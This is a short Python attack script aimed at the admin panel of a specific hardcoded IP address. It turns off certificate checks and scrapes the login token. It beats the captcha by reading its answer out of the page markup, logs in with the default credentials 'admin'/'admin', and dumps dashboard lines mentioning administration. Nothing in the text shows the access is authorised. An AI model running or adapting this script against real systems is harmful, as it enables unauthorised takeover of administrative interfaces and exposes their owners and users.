#!/usr/bin/env python3
"""
Extract admin-specific content from dashboard
"""

import requests
import re

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Login
r = sess.get(TARGET + "/admin/login")
token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
if token_match:
    token = token_match.group(1)
    r = sess.get(TARGET + "/admin/captcha")
    captcha_match = re.search(r'<text[^>]*>(\w)</text>', r.text)
    if captcha_match:
        captcha = captcha_match.group(1)
        r = sess.post(TARGET + "/admin/login", data={
            'username': 'admin',
            'password': 'admin',
            'captcha': captcha,
            '_token': token
        })
        
        # Get dashboard
        r = sess.get(TARGET + "/admin")
        
        # Extract relevant sections
        print("=== Content with '管理' ===")
        lines = r.text.split('\n')
        for i, line in enumerate(lines):
            if '管理' in line or 'admin' in line.lower():
                print(f"[{i}] {line.strip()[:200]}")